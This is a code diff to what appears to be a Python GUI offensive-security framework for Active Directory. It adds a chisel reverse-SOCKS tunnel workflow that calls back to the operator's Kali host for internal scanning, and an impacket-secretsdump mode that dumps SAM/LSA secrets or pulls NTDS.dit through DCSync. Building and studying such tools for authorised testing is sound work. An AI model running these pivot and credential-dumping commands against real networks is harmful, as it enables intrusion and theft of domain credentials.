+            # the server, that isn't an error state.
+            import subprocess as _sp
+            _port = p
+
+            class _ChiselStopRunner:
+                def __init__(self, port):
+                    self.port = port
+
+                def kill(self):
+                    try:
+                        r = _sp.run(
+                            ["pkill", "-f",
+                             f"chisel server --port {self.port} "
+                             f"--reverse"],
+                            capture_output=True, text=True,
+                            timeout=5)
+                        # pkill returns 0 on kill, 1 on no-match.
+                        return r.returncode == 0
+                    except Exception:
+                        return False
+
+            self._tool_runners[tool.id] = _ChiselStopRunner(_port)
+            self._toggle_run_btn(tool, True)
+
+            def _stop_chisel_here(t=tool, port=_port):
+                runner = self._tool_runners.get(t.id)
+                killed = bool(runner and runner.kill())
+                self.app.terminal.write(
+                    (f"  [*] CHISEL Server on :{port} stopped."
+                     if killed
+                     else f"  [!] CHISEL Server on :{port}: nothing "
+                          "to kill (already closed?)."),
+                    "warn")
+                self._set_tool_status(t.id, "ready")
+                self._toggle_run_btn(t, False)
+                self._tool_runners.pop(t.id, None)
+                # _toggle_run_btn(..., False) resets the button's
+                # command to `_gate_check` (the generic capture-and-
+                # log runner path), which for chisel_server is exactly
+                # what we DON'T want — it would relaunch the listener
+                # inline in HAWK instead of an xterm.  Restore our
+                # own route so the next RUN reopens the dialog.
+                try:
+                    w2 = self._tool_widgets.get(t.id)
+                    if w2 and "run_btn" in w2:
+                        w2["run_btn"].configure(
+                            command=lambda tt=t:
+                                self._route_chisel_server(tt))
+                except Exception:
+                    pass
+
+            try:
+                w = self._tool_widgets.get(tool.id)
+                if w and "run_btn" in w:
+                    w["run_btn"].configure(command=_stop_chisel_here)
+            except Exception:
+                pass
+
+            # No target-intel finding here on purpose: chisel_server
+            # binds a Kali-local port, it does not touch the target.
+            # A target-intel row would be misleading — the Target
+            # Intel panel describes the REMOTE host, not what Kali is
+            # listening on.  RDP Connect and impacket-exec push
+            # findings because they actually reach out to the target;
+            # a bare listener does not.
+
+            # Chain hint.
+            try:
+                self.app.terminal.write(
+                    "→ Next: transfer chisel to the pivot ('Chisel "
+                    "(Windows, download)' card puts chisel.exe in "
+                    "payloads/; use smbclient put / wmiexec upload), "
+                    "then run 'chisel client "
+                    f"{kali_ip}:{p} R:socks' on the target.  A SOCKS5 "
+                    "proxy appears on Kali at 127.0.0.1:1080 — probe "
+                    "with 'proxychains nmap -sT -Pn <internal_ip>'.",
+                    "info")
+            except Exception:
+                pass
+
+        row = _btn_row(win)
+        _btn(row, "▶  START LISTENER", _launch, primary=True, w=180)
+        _btn(row, "CANCEL", lambda: _safe_destroy(win), w=100)
 
     def _route_chisel_client(self, tool):
         """Guided workflow for the chisel reverse-SOCKS tunnel.
@@ -2170,15 +4199,19 @@ class CardADRoutesMixin:
         try:
             sess = self.app.session_manager.current
             if sess:
-                # Walk creds looking for machine accounts — username
-                # ending in '$' is the reliable signal (addcomputer
-                # always creates one that way).  Iterate in insertion
-                # order (latest-added usually wins on equal scoring).
+                fallback = ""
                 for c in (sess.get_credentials() or []):
                     u = (c.username or "").strip()
-                    if u.endswith("$") and len(u) > 1:
+                    if not (u.endswith("$") and len(u) > 1):
+                        continue
+                    svcs = getattr(c, "services", []) or []
+                    if "Computer" in svcs:
                         attacker = u.rstrip("$")
                         break
+                    if not fallback:
+                        fallback = u.rstrip("$")
+                if not attacker:
+                    attacker = fallback
         except Exception:
             pass
 
@@ -2931,6 +4964,10 @@ class CardADRoutesMixin:
         hash_var   = ctk.StringVar(value=dh)
         domain_var = ctk.StringVar(value=dd)
         extras_var = ctk.StringVar(value="")
+        # MODE state — only meaningful for the consolidated
+        # impacket_secretsdump card (Target dump | DCSync); ignored
+        # for every other AD tool routed through this dialog.
+        secretsdump_mode_var = ctk.StringVar(value="Target dump")
 
         _row("Username", user_var, "",
              "required — any domain user works for most commands")
@@ -2940,6 +4977,64 @@ class CardADRoutesMixin:
              "optional — pass-the-hash; overrides password when filled")
         _row("Domain",   domain_var, "",
              "required for most AD tools (e.g. CORP.LOCAL, htb.local)")
+
+        # ── MODE dropdown (impacket_secretsdump only) ────────────────
+        # Consolidated Target-dump / DCSync card: the mode picks the
+        # extra flags that turn a plain
+        # "impacket-secretsdump user:pass@target" into either
+        # (a) local SAM+LSA dump (no extras — the base template) or
+        # (b) DRSUAPI DCSync replica of the full NTDS.dit
+        #     (adds "-just-dc -outputfile <OUTPUTS>/ntds-<target>").
+        # Switching mode overwrites extras_var with the mode's
+        # defaults; the operator can still hand-edit / add chips
+        # afterwards.
+        if tool.id == "impacket_secretsdump":
+            from utils.config import OUTPUTS_DIR as _OUTPUTS_DIR
+            _DCSYNC_EXTRAS = (
+                f"-just-dc -outputfile {_OUTPUTS_DIR}/ntds-{target}")
+            _TARGET_DUMP_EXTRAS = ""
+
+            def _apply_mode(*_):
+                m = secretsdump_mode_var.get()
+                if m == "DCSync":
+                    extras_var.set(_DCSYNC_EXTRAS)
+                else:
+                    # Target dump: only clear extras if they still
+                    # match the auto-added DCSync defaults; anything
+                    # the operator hand-typed on top is preserved.
+                    if extras_var.get().strip() == _DCSYNC_EXTRAS:
+                        extras_var.set(_TARGET_DUMP_EXTRAS)
+
+            secretsdump_mode_var.trace_add("write", _apply_mode)
+
+            m_row = ctk.CTkFrame(body, fg_color="transparent")
+            m_row.pack(fill="x", padx=24, pady=(6, 0))
+            ctk.CTkLabel(m_row, text="Mode", width=110, anchor="w",
+                         font=_f("sm", True),
+                         text_color=COLORS["text_bright"]).pack(side="left")
+            ctk.CTkOptionMenu(
+                m_row, variable=secretsdump_mode_var,
+                values=["Target dump", "DCSync"],
+                width=180, height=30, font=_f("sm"),
+                fg_color=COLORS["bg_card"],
+                button_color=COLORS["border_green"],
+                button_hover_color=COLORS["border_dim"],
+                text_color=COLORS["text_bright"],
+                dropdown_fg_color=COLORS["bg_card"],
+                dropdown_hover_color=COLORS["border_green"],
+                dropdown_text_color=COLORS["text_bright"],
+            ).pack(side="left")
+            ctk.CTkLabel(
+                body,
+                text=("Target dump: SAM+LSA on the host you OWN "
+                      "(local admin required) · DCSync: NTDS.dit "
+                      "replica from the DC (DA / DS-Replication "
+                      "required)"),
+                font=_f("xs"),
+                text_color=COLORS["text_dim"],
+                anchor="w").pack(fill="x", padx=24)
+            # Apply the initial mode (Target dump = no extras added).
+            _apply_mode()
 
         # ── Anonymous warning (live) ─────────────────────────────────
         # Active Directory rejects anonymous LDAP binds since Server
